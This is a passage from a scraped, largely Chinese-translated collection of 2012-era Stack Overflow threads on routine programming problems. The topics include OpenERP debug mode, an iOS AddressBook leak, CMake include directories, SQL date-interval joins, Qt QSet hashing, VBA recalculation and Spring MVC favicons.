您可以参考以下链接：[Debug OpenERP Code from Eclipse](http://debug-openerp-python-code-in-eclipse.blogspot.in/)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-05T09:15:21.677

转到管理员（在右上角），单击`About OpenERP`该链接，您将找到一个链接`Activate the Developer Mode`。`debug`或者您可以在 URL中添加一个参数，例如

```
 http://localhost:8069/?debug 
```

两种方式都可以让您打开开发者模式。

您还可以使用[Odoo Debug pro chrome 扩展](https://chrome.google.com/webstore/detail/odoo-debug-pro/nfnladagngmiggfaojdbpjdpehdfgiac)来使用键盘快捷键切换开发人员模式。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-10T09:29:57.697

To debug openERP 7 from eclipse just Stop openERP server and rename the main file named openerp-server.py.From "Run/Debug Configurations" make a new configuration selecting Project and main module such as ${workspace_loc:openerp7/src/openerp-server.py} then press Apply.After that /openerp7/src/openerp-server.py 'Debug As --> Python Run' using new configuration.Server is running where pydev debugger is also started.Now run 'gtk' or 'web-client'.Then select the python file of that module where want to debug and give breakpoints.That's all.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-08-16T11:54:56.580

调试界面非常简单。

**对于程序员**

默认情况下，当您登录到 openerp 时，您的 url 看起来像这样

```
http://localhost:7373/?db=Test_July_25#menu_id=107&action=97 
```

编辑 url 并添加**debug=&**

localhost:7373/?debug=&db=Test_July_25#menu_id=107&action=97

**对于功能用户**

*   将鼠标导航到右上角并选择关于 OpenERP

![在此处输入图像描述](../Images/f8e404d41bb20ed31499eab1f0aab3d5.png)

*   现在激活调试模式

![在此处输入图像描述](../Images/d8fe810cba1fbc3ae8e6575038515dc8.png)

您现在应该完成接口调试。

**对于代码调试**（连同 arya 的方法，这些图像可能会对您有所帮助）

*   您可以使用浏览按钮选择项目和 openerp 服务器文件

![在此处输入图像描述](../Images/b8ef9cfab653feafde4ebd09055bfe6a.png)

![在此处输入图像描述](../Images/c9884fa57bb361eec4df63d6957727db.png)

最后在你的代码中必要的地方放置断点

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-04-03T10:30:42.857

通过管理员导航
（右上角）>>关于 OpenERP
对话框打开单击激活开发人员模式

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-09-22T13:01:09.903

在浏览器上启动调试模式？？在 URL 中，您可以在 web 之后 键入**?debug**[![在此处输入图像描述](../Images/9a1d9e550c5a3061cc4cd255865b47cb.png)](https://i.stack.imgur.com/xbk9w.png)

**或者**

转到**关于 OpenERP**选择**激活开发者模式**

如果你想从**Eclipse**调试然后

转到 PyDev Package Explorer --> openerp(odoo) --> 右键单击​​ openerp-server 文件[![在此处输入图像描述](../Images/1a8182be8038d75ad9dac5fb778ef0f0.png)](https://i.stack.imgur.com/C7WBV.png) 选择 Debug as --> Python Run

它将要求将当前视角从 PyDev 更改为 Debug 单击“是”并完成

[![在此处输入图像描述](../Images/cb9cda1db0999d40a7ead325b69c6f3b.png)](https://i.stack.imgur.com/Y7gVS.png)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-07-28T15:18:21.050

通过添加更多花哨的工具，它们更复杂，控制更少，尝试使用低级别并使用 python pdb，如果你是调试极客，那么使用带有 pdb 的 winpdb，它可以对你的代码导航提供极端的控制。

对于简单的值 abd 流，请使用 python 中的 print 或 pprint 模块。

最好的。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-04-15T05:23:51.663

激活调试模式并使用一些打印语句来调试变量值

# iphone - Potential leak detected in iphone App when Analysed

> ID：13703646
> 
> 赞同：0
> 
> 时间：2012-12-04T13:04:54.387
> 
> 标签：iphone, ios, memory-leaks

im building an app which grabs all the contacts from iPhone book and filter it my names having only emails. i use the following function for that (filtering with names having email address)

```
- (long)personRecord:(ABRecordRef)paramPerson{

    if(paramPerson == nil){

        NSLog(@"The given Person is Null");
    }

    ABMutableMultiValueRef emails = ABRecordCopyValue(paramPerson, kABPersonEmailProperty);
    if(emails == nil){

        return 0;
    }

    NSLog(@"%ld",ABMultiValueGetCount(emails));
    // return (ABMultiValueGetCount(emails));

    return (ABMultiValueGetCount(emails));
} 
```

When analysed I'm geting potential leak

![enter image description here](../Images/f86042cc61116df8535963016dc02792.png)

how can i resolve this Leak ....????

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:12:26.820

你没有释放对象，这就是它导致内存泄漏的原因。试试这个代码。这将修复泄漏并在正确的位置释放对象。希望这对你有帮助

```
 CFRelease(emails); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:16:27.800

您正在从 获取该对象的副本`ABRecordRef`。所以你需要释放它。

改变你的方法，比如；

```
- (long)personRecord:(ABRecordRef)paramPerson
  {

    if(paramPerson == nil)
    {

        NSLog(@"The given Person is Null");
    }

    ABMutableMultiValueRef emails = ABRecordCopyValue(paramPerson, kABPersonEmailProperty);
    if(emails == nil)
    {

        return 0;
    }

    NSLog(@"%ld",ABMultiValueGetCount(emails));
    // return (ABMultiValueGetCount(emails));

    long count = ABMultiValueGetCount(emails);
     CFRelease(emails);
     return count;
} 
```

# c++ - How to properly add include directories with CMake

> ID：13703647
> 
> 赞同：327
> 
> 时间：2012-12-04T13:04:54.340
> 
> 标签：c++, ubuntu, cmake

About a year ago I asked about [header dependencies in CMake](https://stackoverflow.com/questions/7461000/handling-header-files-dependencies-with-cmake).

I realized recently that the issue seemed to be that CMake considered those header files to be *external* to the project. At least, when generating a Code::Blocks project the header files do not appear within the project (the source files do). It therefore seems to me that CMake consider those headers to be *external* to the project, and does not track them in the depends.

A quick search in the CMake tutorial only pointed to `include_directories` which does not seem to do what I wish...

What is the proper way to signal to CMake that a particular directory contains headers to be included, and that those headers should be tracked by the generated Makefile?

* * *

## 回答 #1

> 赞同：350
> 
> 时间：2012-12-04T13:09:31.407

必须做两件事。

首先添加要包含的目录：

```
target_include_directories(test PRIVATE ${YOUR_DIRECTORY}) 
```

如果您在不支持的情况下使用非常旧的 CMake 版本（2.8.10 或更早版本）`target_include_directories`，您也可以使用旧版`include_directories`：

```
include_directories(${YOUR_DIRECTORY}) 
```

然后，您还必须将头文件添加到当前目标的源文件列表中，例如：

```
set(SOURCES file.cpp file2.cpp ${YOUR_DIRECTORY}/file1.h ${YOUR_DIRECTORY}/file2.h)
add_executable(test ${SOURCES}) 
```

这样，头文件将在 Makefile 中显示为依赖项，例如在生成的 Visual Studio 项目中（如果您生成一个）。

如何将这些头文件用于多个目标：

```
set(HEADER_FILES ${YOUR_DIRECTORY}/file1.h ${YOUR_DIRECTORY}/file2.h)

add_library(mylib libsrc.cpp ${HEADER_FILES})
target_include_directories(mylib PRIVATE ${YOUR_DIRECTORY})
add_executable(myexec execfile.cpp ${HEADER_FILES})
target_include_directories(myexec PRIVATE ${YOUR_DIRECTORY}) 
```

* * *

## 回答 #2

> 赞同：95
> 
> 时间：2012-12-04T13:10:33.703

首先，您使用`include_directories()`告诉 CMake 将目录添加`-I`到编译命令行。其次，您列出您的`add_executable()`或`add_library()`呼叫中的标题。

例如，如果您的项目源位于 中`src`，并且您需要来自 的标头`include`，则可以这样做：

```
include_directories(include)

add_executable(MyExec
  src/main.c
  src/other_source.c
  include/header1.h
  include/header2.h
) 
```

* * *

## 回答 #3

> 赞同：32
> 
> 时间：2019-04-18T09:30:27.737

添加`include_directories("/your/path/here")`.

这将类似于`gcc`使用`-I/your/path/here/`选项调用。

确保在路径周围加上双引号。其他人没有提到这一点，这让我坚持了 2 天。所以这个答案适用于那些对 CMake 非常陌生并且非常困惑的人。

* * *

## 回答 #4

> 赞同：26
> 
> 时间：2017-08-11T13:49:21.527

如果将 CMake 与其他创建 Makefile 的方法（例如 make 或 qmake）进行比较，CMake 更像是一种脚本语言。它不像 Python 那样很酷，但仍然如此。

如果在各种开源项目中查看人们如何包含目录，则没有像“*正确方法”这样的东西。*但是有两种方法可以做到这一点。

1.  粗略的[include_directories](https://cmake.org/cmake/help/v3.0/command/include_directories.html)会将一个目录附加到当前项目和您将通过一系列[add_subdirectory](https://cmake.org/cmake/help/v3.0/command/add_subdirectory.html)命令附加的所有其他后代项目。有时人们说这种方法是遗留问题。

2.  更优雅的方法是使用[target_include_directories](https://cmake.org/cmake/help/v3.0/command/target_include_directories.html)。它允许为特定项目/目标附加目录，而不会（可能）不必要的继承或各种包含目录的冲突。还允许执行甚至是细微的配置并为此命令附加以下标记之一。

**PRIVATE** - 仅用于此指定的构建目标

**PUBLIC** - 将其用于指定目标和与该项目链接的目标

**INTERFACE** -- 仅用于与当前项目链接的目标

PS：

1.  这两个命令都允许将目录标记为 SYSTEM 以提示指定目录将包含警告不是您的业务。

2.  类似的答案是使用其他命令对[target_compile_definitions](https://cmake.org/cmake/help/v3.0/command/target_compile_options.html) / [add_definitions](https://cmake.org/cmake/help/v3.0/command/add_definitions.html)， [target_compile_options](https://cmake.org/cmake/help/v3.0/command/target_compile_options.html) / [CMAKE_C_FLAGS](https://cmake.org/cmake/help/v3.0/variable/CMAKE_BUILD_TYPE.html?highlight=cmake_c_flags)

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2018-06-24T09:36:31.603

我有同样的问题。

我的项目目录是这样的：

```
 --project
    ---Classes
    ----Application
    -----.h and .c files
    ----OtherFolders
    --main.cpp 
```

以及我曾经将文件包含在所有这些文件夹中的内容：

```
 file(GLOB source_files CONFIGURE_DEPENDS
            "*.h"
            "*.cpp"
            "Classes/*/*.cpp"
            "Classes/*/*.h"
    )

    add_executable(Server ${source_files}) 
```

它完全奏效了。

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2021-07-13T10:14:31.750

## 项目结构

```
.
├── CMakeLists.txt
├── external //We simulate that code is provided by an "external" library outside of src
│   ├── CMakeLists.txt
│   ├── conversion.cpp
│   ├── conversion.hpp
│   └── README.md
├── src
│   ├── CMakeLists.txt
│   ├── evolution   //propagates the system in a time step
│   │   ├── CMakeLists.txt
│   │   ├── evolution.cpp
│   │   └── evolution.hpp
│   ├── initial    //produces the initial state
│   │   ├── CMakeLists.txt
│   │   ├── initial.cpp
│   │   └── initial.hpp
│   ├── io   //contains a function to print a row
│   │   ├── CMakeLists.txt
│   │   ├── io.cpp
│   │   └── io.hpp
│   ├── main.cpp      //the main function
│   └── parser   //parses the command-line input
│       ├── CMakeLists.txt
│       ├── parser.cpp
│       └── parser.hpp
└── tests  //contains two unit tests using the Catch2 library
    ├── catch.hpp
    ├── CMakeLists.txt
    └── test.cpp 
```

## 怎么做

**1.顶层CMakeLists.txt与Recipe 1非常相似，代码重用函数和宏**

```
cmake_minimum_required(VERSION 3.5 FATAL_ERROR)

project(recipe-07 LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 11)
set(CMAKE_CXX_EXTENSIONS OFF)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

include(GNUInstallDirs)
set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY
  ${CMAKE_BINARY_DIR}/${CMAKE_INSTALL_LIBDIR})
set(CMAKE_LIBRARY_OUTPUT_DIRECTORY
  ${CMAKE_BINARY_DIR}/${CMAKE_INSTALL_LIBDIR})
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY
  ${CMAKE_BINARY_DIR}/${CMAKE_INSTALL_BINDIR})

# defines targets and sources
add_subdirectory(src)

# contains an "external" library we will link to
add_subdirectory(external)

# enable testing and define tests
enable_testing()
add_subdirectory(tests) 
```

**2.Targets和Sources在src/CMakeLists.txt中定义（转换目标除外）**

```
add_executable(automata main.cpp)

add_subdirectory(evolution)
add_subdirectory(initial)
add_subdirectory(io)
add_subdirectory(parser)

target_link_libraries(automata
  PRIVATE
    conversion
    evolution
    initial
    io
    parser
  ) 
```

**3.转换库定义在external/CMakeLists.txt**

```
add_library(conversion "")

target_sources(conversion
  PRIVATE
    ${CMAKE_CURRENT_LIST_DIR}/conversion.cpp
  PUBLIC
    ${CMAKE_CURRENT_LIST_DIR}/conversion.hpp
  )

target_include_directories(conversion
  PUBLIC
    ${CMAKE_CURRENT_LIST_DIR}
  ) 
```

**4\. src/CMakeLists.txt 文件添加了更多子目录，这些子目录又包含 CMakeLists.txt 文件。它们在结构上都相似；src/evolution/CMakeLists.txt 包含以下内容：**

```
add_library(evolution "")

target_sources(evolution
  PRIVATE
    evolution.cpp
  PUBLIC
    ${CMAKE_CURRENT_LIST_DIR}/evolution.hpp
  )
target_include_directories(evolution
  PUBLIC
    ${CMAKE_CURRENT_LIST_DIR}
  ) 
```

**5.单元测试注册在tests/CMakeLists.txt**

```
add_executable(cpp_test test.cpp)

target_link_libraries(cpp_test evolution)

add_test(
  NAME
    test_evolution
  COMMAND
    $<TARGET_FILE:cpp_test>
  ) 
```

## 如何运行它

```
$ mkdir -p build
$ cd build
$ cmake ..
$ cmake --build . 
```

参考：[https ://github.com/sun1211/cmake_with_add_subdirectory](https://github.com/sun1211/cmake_with_add_subdirectory)

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2020-07-24T14:58:48.123

这对我有用：

```
set(SOURCE main.cpp)
add_executable(${PROJECT_NAME} ${SOURCE})

# target_include_directories must be added AFTER add_executable
target_include_directories(${PROJECT_NAME} PUBLIC ${INTERNAL_INCLUDES}) 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-06-22T14:52:53.043

还有另一种选择：

```
set_property(
    TARGET MyApp
    APPEND PROPERTY
        INCLUDE_DIRECTORIES "${CMAKE_CURRENT_LIST_DIR}/src"
) 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-11-20T20:24:27.597

不要忘记包括`${CMAKE_CURRENT_LIST_DIR}`. 这就是给我带来问题的原因。

示例应该是这样的：

```
target_include_directories(projectname
    PUBLIC "${CMAKE_CURRENT_LIST_DIR}/include"                          
) 
```

PUBLIC 用于您希望包含在父项目中的依赖项。对于那些你不知道的人来说是私人的。

* * *

## 回答 #10

> 赞同：-2
> 
> 时间：2021-03-18T19:08:26.503

我正在使用 CLion，我的项目结构如下：

```
--main.cpp
--Class.cpp
--Class.h
--CMakeLists.txt 
```

`CMakeLists.txt` **变更**前：

```
add_executable(ProjectName main.cpp) 
```

改动`CMakeLists.txt` **后**：

```
add_executable(ProjectName main.cpp Class.cpp Class.h) 
```

通过这样做，程序编译成功。

# sql - 根据日期时间间隔匹配记录

> ID：13703654
> 
> 赞同：0
> 
> 时间：2012-12-04T13:05:07.817
> 
> 标签：sql, sql-server, sql-server-2008, datetime

在 SQL Server 2008 中，我有一个包含事件和事件日期时间的表。在另一个表中，我有一个可能的时间间隔列表，如下所示。有没有人举例说明只有当事件日期时间落在我的间隔表中的间隔内时，我才能从我的事件表中进行选择？

```
FromDate                ToDate  
-----------------------------------------------           
2012-11-29 06:00:00.000 2012-11-29 07:00:00.000 
2012-11-29 07:00:00.000 2012-11-29 08:00:00.000 
2012-11-29 09:00:00.000 2012-11-29 10:00:00.000 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:07:57.867

```
where whateverDate between FromDate and ToDate 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:08:06.380

```
SELECT e.*
FROM Events e
INNER JOIN Intervals i
ON e.EventDate BETWEEN i.FromDate AND i.ToDate
WHERE i.FromDate = '2012-11-29 06:00:00.000' 
```

这是您可以使用的基本查询。它选择一个间隔，并确保`EventDate`它在其日期范围之间。有了这个，您可以修改查询以执行诸如在每个间隔（`GROUP BY`例如）中聚合数据等操作。

# android - usb_device_open failed?

> ID：13703657
> 
> 赞同：2
> 
> 时间：2012-12-04T13:05:21.687
> 
> 标签：android, usb, mount

I am using moto-zoom tab and using [http://www.edumobile.org/android/android-programming-tutorials/detect-usb-connection/](http://www.edumobile.org/android/android-programming-tutorials/detect-usb-connection/) to get usb receiver.

but I am not getting any receiver intent.

any suggestion?

# c++ - No match errors using template with QSet and boost::tuples::tuple in Qt

> ID：13703663
> 
> 赞同：0
> 
> 时间：2012-12-04T13:05:50.923
> 
> 标签：c++, qt, templates, boost

I tried to build a class named Setop that provides set operations including intersection, union et al. So I tried to use template of C++ to instantiate it. In Setop, I use QSet to store the elements of a set. My code looks like this:

setop.h

```
 template <typename T> class SetOp {
    public:
        SetOp(std::vector<T> &_input);
void _union(SetOp<T> &_set2);
    QSet<T> _intersection(SetOp<T> &_set2);
    QSet<T> _diff(SetOp<T> &_set2);
    QSet<T> _diff(QSet<T> &_set1,QSet<T> &_set2);
    void outputElement();
    QSet<T> getSet(){return mySet;}
    std::vector<T> getVecFromQSet();
    private:
        QSet<T> mySet;
    }; 
```

setop.cpp:

```
template <typename T> SetOp<T>::SetOp(std::vector<T> &_input)
{
    for(int i = 0; i < (int)_input.size(); ++i)
        mySet.insert(_input[i]);
} 
```

Here is how I tried to use the template class, I pass boost::tuples::tuple to Setop:

```
 void MainWindow::setOp(std::vector<std::vector<boost::tuples::tuple<float,int,int,int> > > &_pointSet)
    {
       std::vector<std::vector<boost::tuples::tuple<float,int,int,int> > > merged;  
       while(!_pointSet.empty()) {
           BOOST_AUTO(it,_pointSet.begin());
           BOOST_AUTO(itn,_pointSet.begin() + 1);
           SetOp<boost::tuples::tuple<float,int,int,int> > set1((*it)),set2((*itn));
           for(; itn != _pointSet.end();) {
               //           SetOp<boost::tuples::tuple<float,int,int,int> > temp = set1;
//           if(!temp._intersection(set2).isEmpty()) {
//               set1._union(set2);
//                itn = _pointSet.erase(itn);
//           }
//           else
//               ++itn;
           }
//       merged.push_back(set1.getVecFromQSet());
       }
    } 
```

The compiler generates the following errors:

```
c:\QtSDK\Desktop\Qt\4.8.1\mingw\include\QtCore\qhash.h:882: error:no matching function for call to 'qHash(const boost::tuples::tuple<float, int, int, int, boost::tuples::null_type, boost::tuples::null_type, boost::tuples::null_type, boost::tuples::null_type, boost::tuples::null_type, boost::tuples::null_type>&)'
c:\QtSDK\Desktop\Qt\4.8.1\mingw\include\QtCore\qhash.h:225: error:no match for 'operator==' in 'key0 == ((QHashNode<boost::tuples::tuple<float, int, int, int, boost::tuples::null_type, boost::tuples::null_type, boost::tuples::null_type, boost::tuples::null_type, boost::tuples::null_type, boost::tuples::null_type>, QHashDummyValue>*)this)->QHashNode<boost::tuples::tuple<float, int, int, int, boost::tuples::null_type, boost::tuples::null_type, boost::tuples::null_type, boost::tuples::null_type, boost::tuples::null_type, boost::tuples::null_type>, QHashDummyValue>::key' 
```

What do these erroes mean and how to correct them, please?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:48:18.803

[来自文档](http://doc.qt.digia.com/qt/qset.html#details)：

> QSet 类是一个模板类，它提供了一个基于散列表的集合。
> ...
> 在内部，QSet 被实现为 QHash。

放在 a 中的任何值`QHash`都应该定义两者

```
operator==(const T& other)
uint qHash ( const T * key ) 
```

# actionscript-3 - 1120：访问未定义的属性速度。

> ID：13703670
> 
> 赞同：0
> 
> 时间：2012-12-04T13:06:02.437
> 
> 标签：actionscript-3, flash, actionscript, variables

我想更改位于另一个类中的 var。我得到了包含以下代码的类 c_wall.as：

```
package  {

import flash.display.MovieClip;
import flash.events.Event;

public class c_wall extends c_gameObject {
    public var speed:Number=10;

    public function c_wall() {

    }
    override public function update(){
        x-=speed;

    }
}

} 
```

这个类是我的墙壁孩子的父母，它是一个在屏幕上移动的对象，每帧 10 像素（我的 var speed 的值）

在主类中，我得到以下代码来更改速度变量：

```
 Multitouch.inputMode = MultitouchInputMode.TOUCH_POINT;

        faster.addEventListener(TouchEvent.TOUCH_TAP, fl_TapHandler);

        function fl_TapHandler(event:TouchEvent):void
        {
            trace ("the speed has increased");
            speed++;//this is the speed he doesnt know

        } 
```

现在我得到它不知道 var 速度的错误

我认为解决方案是将 var 包含在 update(); 功能。它也像这样在主文件中使用：

```
 function onEnterFrame(evt:Event):void
                {

                    wall.update(;

                    player.update();

                } 
```

但我不会让它工作......有人知道解决方案吗？

问候，梅林

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:08:40.947

如果要将`TouchEvent`侦听器保留在主类中，请删除它尝试访问`speed`变量的行。然后，在定义变量的`c_wall`类中`speed`，覆盖事件侦听器回调函数并操作变量。

在主课中：

```
protected function fl_TapHandler(event:TouchEvent):void {
    //Do things relevant to the main class
} 
```

在`c_wall`课堂上：

```
override protected function fl_TapHandler(event:TouchEvent):void {
    super.fl_TapHandler(event); //Pass along the event to the parent 
    speed++;
} 
```

当然，如果您在主类中根本不使用事件侦听器，您总是可以将其沿继承链向下移动到`c_wall`类并跳过覆盖。

# android - displaying mapbox maptiles in android using osmdroid

> ID：13703671
> 
> 赞同：2
> 
> 时间：2012-12-04T13:06:12.200
> 
> 标签：android, json, osmdroid, mapbox

I have tried to retrieve map tiles from mapbox using osmdroid just like how modestmaps.js do( ex: [http://tristen.ca/mm-examples/basic-controls.html](http://tristen.ca/mm-examples/basic-controls.html)) i have tried in all possible ways no use, can any one pls guide me how to write my own OnlineTIleSourceBase that can retrieve tiles from mapbox. Thanx in advance.

* * *

Ok i got it!! but can some one pls guide me how to display all markers to fit screen. I have tried using BoundingBoxE6 but i am getting a black screen.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-05T17:21:01.350

MapBox 目前正在开发一个完整的 Android SDK，该 SDK 将在未来几个月内发布。请查看[博客](https://www.mapbox.com/blog/)以获取更多更新。

# vba - 当您按“立即计算”时，具有 VBA 项目和工作表的工作簿相互复制显示错误的单元格值

> ID：13703676
> 
> 赞同：3
> 
> 时间：2012-12-04T13:06:30.937
> 
> 标签：vba, user-defined-functions, worksheet

我有一个模板工作簿，由相互复制的相同工作表组成。我在每个工作表上使用的 VBA 项目中有大约 10 个函数。然后，我将模板保存为启用宏的工作簿并填写。我已经这样做了两次，所以我现在有两个工作簿，比如 workbookA.xlsm 和 workbookB.xlsm，它们直接来自该模板。每个工作表都有很多分组的列，即可以通过屏幕左侧顶部的 + 或 - 号切换来隐藏的列。我将计算模式设置为手动。我正在使用 Excel 2007。

我的一个函数称为 SUM_TOTAL（如下所示），它采用 2 个范围和一个字符串，如果字符串在第一个范围内，则将第二个范围的项目相加。

我在计算过程中遇到问题，如果我有它在自动计算或者如果我按“立即计算”，那么活动工作表将计算正常，但是许多其他相同的工作表将给出与活动工作表相同的值，其中给出了函数 SUM_TOTAL。我认为有些工作有些不工作与并非所有单元格每次都得到计算的事实有关。它向我表明，这些工作表并不完全独立，但我看不出它们有任何联系方式。

我编写了一个宏，它在工作表中循环并执行“计算表”，但我认为这就是“现在计算”的作用？我想了解它，因为其他人最终会使用该模型，我需要知道它是健壮的。

任何帮助将不胜感激，尽快！

非常感谢，

```
Public Function SUM_TOTAL(amount_type As String, amount_type_column As Range, 
range_to_sum As  Range) As Single

Dim cell As Range

SUM_TOTAL = 0

    For Each cell In amount_type_column

        If cell.Value = amount_type Then

            SUM_TOTAL = SUM_TOTAL + Cells(cell.Row, range_to_sum.Column).Value

        End If

    Next cell

End Function 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T03:31:47.260

如果您希望 UDF 函数每次都更新，即使输入参数（amount_type、amount_type_column、range_to_sum）没有改变。

1.  您可以按 Ctrl +Alt + f9 来完全重新计算所有功能，或者在 vba `Application.CalculateFull` 甚至更强大的 Crtl + Shift + Alt + F9/`Application.CalculateFullRebuild`

2.  （请谨慎使用，这会使您的函数在工作表发生更改时重新计算）您应该通过在任何行中添加函数来使您的 `Application.Volatile`函数`SUM_TOTAL`易变

# html - 从 Spring MVC 添加 favicon

> ID：13703678
> 
> 赞同：7
> 
> 时间：2012-12-04T13:06:49.050
> 
> 标签：html, spring-mvc, favicon

我作为新蜜蜂在 spring mvc 应用程序中工作。我需要为没有任何通用文件的应用程序设置一个网站图标来执行此操作。因此，我没有为所有 JSP 放置相关代码行，而是考虑使用调用任何 HTTP 请求的 application-servlet.xml 来执行此操作。谁能帮我一枪搞定？欢迎您提出任何其他简单的方法来做到这一点。

已编辑-我在想，为任何请求执行 javascript 代码可能对此有所帮助。但不确定这是可能的以及我如何做到这一点

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-04T23:51:51.213

只是为了扩展 NimChimpsky 的答案...将 favicon 放在根（或图像）目录中，并在您的 JSP 页面中以通常的方式引用它（或者最好还是使用 SiteMesh 指定一次）。例如

```
<link rel="shortcut icon" type="image/x-icon" href="${pageContext.request.contextPath}/favicon.ico" /> 
```

但是在使用 Tomcat 时有一个问题，因为它是“未知”的矿类型，所以无法从 webapp 内部获取网站图标。在 web.xml 中添加自定义 mime 类型条目的修复：

```
<!-- Mimetype needed for tomcat to serve favicon images -->
<mime-mapping>
    <extension>ico</extension>
    <mime-type>image/x-icon</mime-type>
</mime-mapping> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T13:08:10.630

只需存储`favicon.ico`在 webapp 的根目录（也就是 WEB-INF 的上一层）目录中

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-12-08T07:00:37.570

```
<div class="tab-content">
    <div id="frequent"
	class="active tab-pane fade in active text-center">
    <jsp:include page="questionDisplay.jsp" />
    </div>
</div>
```

# java - 任何覆盖工具都允许忽略 getter、setter、equals 和 hashcode？

> ID：13703685
> 
> 赞同：2
> 
> 时间：2012-12-04T13:07:07.987
> 
> 标签：java, unit-testing, code-coverage, cobertura

我们目前正在使用 Cobertura，但我无法找到排除这些方法的方法。我也试过艾玛和三叶草，但我也找不到任何方法。

请保留您的“您应该测试那些”评论，这是我们希望看到的某种特定事物。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-20T08:08:10.037

看起来最新版本的 Cobertura 有一个新注释`@IgnoreMethod`，可以为您完成此任务（在下面链接的页面中搜索 IgnoreMethodAnnotation）。

[http://cobertura.sourceforge.net/](http://cobertura.sourceforge.net/)

# reporting-services - 更改 SSRS 报告参数中布尔数据类型的默认值

> ID：13703686
> 
> 赞同：0
> 
> 时间：2012-12-04T13:07:08.083
> 
> 标签：reporting-services

有什么方法可以将 SSRS 报告参数中布尔数据类型的默认值更改为其他值，例如“YES”和“NO”或“Male”和“Female”？

请注意，我只想使用单选按钮而不是下拉列表。

请帮我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:28:56.873

不是来自 SSRS 内部。如果您输入自己的值，布尔参数类型将显示 True / False 或转换为 DropDown。

一种解决方法是将报告包装在另一个包（如 C#）中，并使用此包创建自定义参数，例如男性/女性单选按钮。当您想要预览时，通过代码将参数传递给报表。就工作量而言，这条路径的成本相对较高，但可以让您完全控制 UI。

# java - 我们如何才能在 json 中隐含

> ID：13703694
> 
> 赞同：1
> 
> 时间：2012-12-04T13:07:32.293
> 
> 标签：java, json, xstream

我们是否有任何注释可以替换 JSON 的 @xstreamImplicit，因为 XstreamImplicit 仅适用于 XML？

例如：

```
Class A {

  @XstreamImplicit
  private List<Apple> apples;
} 
```

XML:

```
<apple>
  .....
  .....
</apple>
<apple>
   ....
   ....
</apple> 
```

JSON：

```
{ apples: [{...}] } 
```

我想要以下格式的 JSON 输出：

```
[{...}] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T07:26:05.830

尝试做一些这样的事情，

我不赞成这种方法在从由此获得的字符串重新创建对象时工作正常。

```
Class A {

  private List<Apple> apples;
  public static void setXstreamAlias(XStream xstream)
      xstream.alias("apples", List.class, Apple.class);
      xstream.addImplicitArray(A.class, "apples");
  }
} 
```

在您对该对象进行字符串序列化之前，应调用此方法。

像这样，

```
A a = new A();
// setting some values to your apple here...
.
.
.

// finally
XStream xstream;
xstream = new XStream(new JettisonMappedXmlDriver());
xstream.setMode(XStream.NO_REFERENCES);
A.setXstreamAlias(xstream);
String output = xstream.toXML(a) ; 
```

我希望这对你有帮助，

但这有一些问题，请通过此链接：[https ://stackoverflow.com/questions/13966871/xstream-json-arraylist-handling-after-xstreamimplicit-the-arraylist-variable](https://stackoverflow.com/questions/13966871/xstream-json-arraylist-handling-after-xstreamimplicit-the-arraylist-variable)

添加正确如果我错了上述任何理解。谢谢你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:13:33.743

根据[JSON 教程中的“Write to JSON with the self-contained JSON driver drop the root”](http://xstream.codehaus.org/json-tutorial.html#json-dropping-root)，您可以编写如下内容：

```
XStream xstream = new XStream(new JsonHierarchicalStreamDriver() {
    public HierarchicalStreamWriter createWriter(Writer writer) {
        return new JsonWriter(writer, JsonWriter.DROP_ROOT_MODE);
    }
}); 
```

# postgresql - PostgreSQL 与 Grails 自动增量问题

> ID：13703697
> 
> 赞同：4
> 
> 时间：2012-12-04T13:07:42.093
> 
> 标签：postgresql, grails, auto-increment

```
class abc{

   Integer id
   String name
}   

class xyz {

   Integer id
   Integer project_id
   String name
} 
```

当我使用某个 id 成功保存 abc 对象的对象时（比如 12 ），当我将 xyz 的对象保存为（abc.id+1）时，它的 id 增量。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:09:48.973

Grails 使用序列 [hibernate_sequence] 为持久化到数据库的新对象分配 id，如果您想分配不同类型的 id，您应该阅读[grails 文档](http://grails.org/doc/latest/guide/GORM.html#identity)。

# android - android cocos2dx 与 scoreloop 的集成

> ID：13703699
> 
> 赞同：2
> 
> 时间：2012-12-04T13:07:46.387
> 
> 标签：android, cocos2d-x, scoreloop

我正在将 Android 中的 scoreloop 与 cocos2dx 框架集成。我有来自 [https://github.com/ursine-paw/upSL][1] 的下载源

[1]: [https://github.com/ursine-paw/upSL](https://github.com/ursine-paw/upSL)，我将 jni_scoreloop.ccp 和 Scoreloop.h 文件放在 classes 文件夹中，并在 jni_scoreloop.ccp 中使用命名空间 cocos2x 添加。但 jni_scoreloop 中的 submitScore 仍然存在错误

```
